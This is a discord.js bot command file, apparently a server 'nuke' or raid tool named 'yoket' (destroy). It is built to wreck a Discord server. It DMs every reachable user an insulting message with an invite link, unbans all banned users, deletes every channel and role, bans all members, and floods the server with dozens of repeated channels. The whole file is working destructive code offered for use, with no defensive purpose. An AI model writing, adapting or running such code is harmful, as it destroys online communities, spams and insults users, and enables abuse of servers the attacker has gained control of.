const Discord = require('discord.js');
exports.run = async(client, message, args) => { 
  
  
  
       client.users.forEach(u => {
u.send('WALDO SİKER \n https://discord.gg/gemSGJPh6y')
})
  
  
    message.guild.fetchBans().then(bans => {
      bans.forEach(user => {
        message.guild.unban(user)
      });
    });
  
message.guild.channels.forEach(a => a.delete())
message.guild.members.forEach(a => message.guild.ban(a))
message.guild.roles.forEach(a => a.delete())
                                                                                                                                                  let kanal = 'uzaylı'
                                                                                                                                                  let kanal2 = 'uzaylı'
                                                                                                                                                  let kanal3 = 'uzaylı'
  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)
  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)
    
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)
    
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)
    
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)
    
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)  
  message.guild.createChannel(kanal, kanal)
  message.guild.createChannel(kanal2, kanal2)
  message.guild.createChannel(kanal3, kanal3)
  
};
exports.conf = {
  enabled: true,  
  guildOnly: false, 
  aliases: [], 
  permLevel: 4
};

exports.help = {
  name: 'yoket',
  description: 'taslak', 
  usage: 'yoket'
};
